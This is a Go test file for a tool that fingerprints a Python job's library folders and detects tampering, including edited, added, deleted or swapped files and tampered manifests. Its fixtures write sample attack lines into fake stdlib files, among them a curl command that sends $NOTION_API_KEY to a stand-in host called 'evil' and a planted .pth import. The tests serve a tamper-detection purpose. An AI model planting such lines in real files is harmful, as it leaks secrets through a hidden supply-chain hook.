// Copyright 2026 Meni Tasa
// SPDX-License-Identifier: LicenseRef-PolyForm-Perimeter-1.0.0

package job

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

// Library roots (libroots.go): jobs.json holds one hash per root, the
// manifests outside it only name the file, and nothing a manifest says can
// make a changed library pass.

// stored is fp as jobs.json gives it back: through JSON, so without the
// per-file lists Compute kept.
func stored(t *testing.T, fp Fingerprint) Fingerprint {
	t.Helper()
	b, err := json.Marshal(fp)
	if err != nil {
		t.Fatal(err)
	}
	var out Fingerprint
	if err := json.Unmarshal(b, &out); err != nil {
		t.Fatal(err)
	}
	if out.Libs != nil || out.libLines != nil {
		t.Fatal("the per-file lists survived jobs.json")
	}
	return out
}

// approveWithManifests fingerprints f as approval does: the manifests
// saved, the fingerprint as jobs.json holds it.
func approveWithManifests(t *testing.T, f pyFixture) (Fingerprint, LibManifests) {
	t.Helper()
	a := mustCompute(t, f.dir, f.prog)
	m := LibManifests(filepath.Join(t.TempDir(), "job-libraries"))
	if err := m.Save(a); err != nil {
		t.Fatal(err)
	}
	return stored(t, a), m
}

func TestStoredLibrariesNameTheChangedFile(t *testing.T) {
	const lib = "lib/python3.14"
	for _, c := range []struct {
		name   string
		rel    string // under the installation
		change func(t *testing.T, path string)
		kind   ChangeKind
	}{
		{"an edited stdlib file", lib + "/encodings/__init__.py", func(t *testing.T, p string) {
			write(t, p, "import os; os.system('curl -d @- evil <<< $NOTION_API_KEY')\n")
		}, Changed},
		{"a .pth planted in site-packages", lib + "/site-packages/zzz.pth", func(t *testing.T, p string) {
			write(t, p, "import evil\n")
		}, Added},
		{"a stdlib file deleted", lib + "/json/__init__.py", func(t *testing.T, p string) {
			if err := os.Remove(p); err != nil {
				t.Fatal(err)
			}
		}, Removed},
		{"a stdlib file swapped and put back", lib + "/os.py", putBack, Rewritten},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := pythonFixture(t)
			approved, m := approveWithManifests(t, f)
			path := filepath.Join(f.base, c.rel)
			c.change(t, path)
			d := m.Diff(approved, mustCompute(t, f.dir, f.prog))
			if len(d) != 1 || d[0] != (Change{path, c.kind}) {
				t.Fatalf("Diff = %v, want %s %s", d, path, c.kind)
			}
			if !strings.Contains(d[0].Sentence(), path) {
				t.Fatalf("the stop does not name the file: %q", d[0].Sentence())
			}
		})
	}
}

// putBack writes over p and puts its content and modification time back:
// only the change-time, which the kernel sets, says it happened.
func putBack(t *testing.T, p string) {
	t.Helper()
	info, err := os.Stat(p)
	if err != nil {
		t.Fatal(err)
	}
	old, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	time.Sleep(20 * time.Millisecond) // a change-time is nanosecond-precise; make it move visibly
	write(t, p, strings.Repeat("x", len(old)))
	write(t, p, string(old))
	if err := os.Chtimes(p, info.ModTime(), info.ModTime()); err != nil {
		t.Fatal(err)
	}
}

func TestMissingManifestStopsAndNamesTheFolder(t *testing.T) {
	for _, c := range []struct {
		name   string
		change func(t *testing.T, f pyFixture)
		kind   ChangeKind
		words  string
	}{
		{"an edited file", func(t *testing.T, f pyFixture) {
			write(t, filepath.Join(f.base, "lib/python3.14/encodings/__init__.py"), "import evil\n")
		}, FolderChanged, "changed since you approved it"},
		{"a file swapped and put back", func(t *testing.T, f pyFixture) {
			putBack(t, filepath.Join(f.base, "lib/python3.14/os.py"))
		}, FolderRewritten, "was written to since you approved it"},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := pythonFixture(t)
			approved, m := approveWithManifests(t, f)
			if err := os.RemoveAll(string(m)); err != nil {
				t.Fatal(err)
			}
			c.change(t, f)
			now := mustCompute(t, f.dir, f.prog)
			for _, lm := range []LibManifests{m, ""} {
				d := lm.Diff(approved, now)
				if len(d) != 1 || d[0] != (Change{f.base, c.kind}) {
					t.Fatalf("Diff with manifests %q = %v, want the folder %s", lm, d, f.base)
				}
				s := d[0].Sentence()
				if !strings.Contains(s, "a file in "+f.base+" ") || !strings.Contains(s, c.words) || !strings.Contains(s, "can't say which") {
					t.Fatalf("sentence = %q", s)
				}
			}
		})
	}
}

func TestTamperedManifestCannotHideOrMisnameAChange(t *testing.T) {
	f := pythonFixture(t)
	approved, m := approveWithManifests(t, f)
	manifest := filepath.Join(string(m), approved.LibRoots[f.base].manifestName())
	original, err := os.ReadFile(manifest)
	if err != nil {
		t.Fatalf("approval kept no manifest for the installation: %v", err)
	}
	enc := filepath.Join(f.base, "lib/python3.14/encodings/__init__.py")
	write(t, enc, "import os; os.system('send $NOTION_API_KEY')\n")
	now := mustCompute(t, f.dir, f.prog)

	var blame libManifest
	if err := json.Unmarshal(original, &blame); err != nil {
		t.Fatal(err)
	}
	for i := range blame.Files {
		if blame.Files[i].Rel == "lib/python3.14/json/__init__.py" {
			blame.Files[i].Val = "sha256:" + strings.Repeat("0", 64)
		}
	}
	for _, c := range []struct {
		name  string
		plant func(t *testing.T)
	}{
		{"rewritten to list the library as it is now", func(t *testing.T) {
			b, err := json.Marshal(libManifest{Version: manifestVersion, Files: now.libLines[f.base]})
			if err != nil {
				t.Fatal(err)
			}
			writeBytes(t, manifest, b)
		}},
		{"rewritten to blame another file", func(t *testing.T) {
			b, err := json.Marshal(blame)
			if err != nil {
				t.Fatal(err)
			}
			writeBytes(t, manifest, b)
		}},
		{"not JSON", func(t *testing.T) { write(t, manifest, "{") }},
		{"a named pipe", func(t *testing.T) {
			if err := syscall.Mkfifo(manifest, 0o600); err != nil {
				t.Fatal(err)
			}
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			_ = os.Remove(manifest)
			c.plant(t)
			d := m.Diff(approved, now)
			if len(d) != 1 || d[0] != (Change{f.base, FolderChanged}) {
				t.Fatalf("Diff = %v, want only the folder %s named", d, f.base)
			}
		})
	}

	// Put back, the manifest names the file again: the cases above failed
	// on the tampering, not on the manifest's form.
	_ = os.Remove(manifest)
	writeBytes(t, manifest, original)
	if d := m.Diff(approved, now); len(d) != 1 || d[0] != (Change{enc, Changed}) {
		t.Fatalf("with the real manifest: %v", d)
	}
	// And a manifest is read only once a hash differs: a damaged one never
	// stops a job whose libraries match.
	again, m2 := approveWithManifests(t, f)
	for _, r := range again.LibRoots {
		if r.Dir {
			write(t, filepath.Join(string(m2), r.manifestName()), "{")
		}
	}
	if d := m2.Diff(again, mustCompute(t, f.dir, f.prog)); len(d) != 0 {
		t.Fatalf("damaged manifests and unchanged libraries: %v", d)
	}
}

// A Python job's fingerprint in jobs.json stays small, whatever the size of
// the installation: two thousand library files used to be about 700 KB.
func TestJobsJSONStaysSmallPerPythonJob(t *testing.T) {
	size := func(t *testing.T, stdlib int) (int, Fingerprint) {
		f := pythonFixture(t)
		for i := 0; i < stdlib; i++ {
			write(t, filepath.Join(f.base, fmt.Sprintf("lib/python3.14/pkg%02d/mod%04d.py", i%40, i)), fmt.Sprintf("# module %d\n", i))
		}
		fp := mustCompute(t, f.dir, f.prog)
		j := &Job{Name: "notion-guests", Dir: f.dir, Argv: f.prog.Argv, Exe: f.prog.Exe, Ask: AskNever, Fingerprint: fp}
		data, err := Encode(map[string]*Job{j.Name: j}, nil)
		if err != nil {
			t.Fatal(err)
		}
		return len(data), fp
	}
	small, _ := size(t, 0)
	big, fp := size(t, 2000)
	if fp.LibraryFiles() < 2000 {
		t.Fatalf("the installation holds %d library files, want 2,000 or more", fp.LibraryFiles())
	}
	t.Logf("jobs.json with a %d-file Python: %d bytes (%d with the bare fixture), %d library roots", fp.LibraryFiles(), big, small, len(fp.LibRoots))
	const bound = 8 << 10
	if big > bound {
		t.Fatalf("jobs.json holds %d bytes for one Python job, want at most %d", big, bound)
	}
	if big-small > 64 {
		t.Fatalf("jobs.json grew %d bytes for 2,000 more library files; it must not grow per file", big-small)
	}
}

// A job approved by the build before roots (#177's per-file Libs, LibsV 1)
// stops with the older-jit sentence, not a list of two thousand files.
func TestPerFileApprovalStopsAsOlder(t *testing.T) {
	f := pythonFixture(t)
	now := mustCompute(t, f.dir, f.prog)
	b, err := json.Marshal(stored(t, now))
	if err != nil {
		t.Fatal(err)
	}
	var raw map[string]any
	if err := json.Unmarshal(b, &raw); err != nil {
		t.Fatal(err)
	}
	delete(raw, "lib_roots")
	libs := map[string]string{}
	for k, v := range now.Libs {
		libs[k] = v
	}
	raw["libs"], raw["libs_v"] = libs, 1
	b, err = json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	var old Fingerprint
	if err := json.Unmarshal(b, &old); err != nil {
		t.Fatal(err)
	}
	d := Diff(old, now)
	if len(d) != 1 || d[0] != (Change{LibsPath, Unchecked}) {
		t.Fatalf("Diff = %v, want only the older-jit stop", d)
	}
	if s := d[0].Sentence(); !strings.Contains(s, "approved by an older jit") {
		t.Fatalf("sentence = %q", s)
	}
}

func TestLibManifestsAreSharedPrivateAndPruned(t *testing.T) {
	f := pythonFixture(t)
	a := mustCompute(t, f.dir, f.prog)
	m := LibManifests(filepath.Join(t.TempDir(), "job-libraries"))
	if err := m.Save(a); err != nil {
		t.Fatal(err)
	}
	if err := m.Save(a); err != nil { // a second job on the same Python
		t.Fatal(err)
	}
	names := func() []string {
		entries, _ := os.ReadDir(string(m))
		var out []string
		for _, e := range entries {
			out = append(out, e.Name())
		}
		return out
	}
	dirs := 0
	for _, r := range a.LibRoots {
		if r.Dir {
			dirs++
		}
	}
	if got := names(); len(got) != dirs {
		t.Fatalf("manifests %v, want one per walked root (%d)", got, dirs)
	}
	if info, err := os.Stat(string(m)); err != nil || info.Mode().Perm() != 0o700 {
		t.Fatalf("the manifests' folder: %v %v", info.Mode(), err)
	}
	for _, n := range names() {
		if info, err := os.Stat(filepath.Join(string(m), n)); err != nil || info.Mode().Perm() != 0o600 {
			t.Fatalf("%s: %v %v", n, info.Mode(), err)
		}
	}
	stray := filepath.Join(string(m), "notes.txt")
	write(t, stray, "not a manifest")
	if err := m.Keep([]Fingerprint{stored(t, a)}); err != nil || len(names()) != dirs+1 {
		t.Fatalf("Keep with the job still there: %v %v", err, names())
	}
	if err := m.Keep(nil); err != nil {
		t.Fatal(err)
	}
	if got := names(); len(got) != 1 || got[0] != "notes.txt" {
		t.Fatalf("after the last job went: %v, want only the file that is not a manifest", got)
	}
}
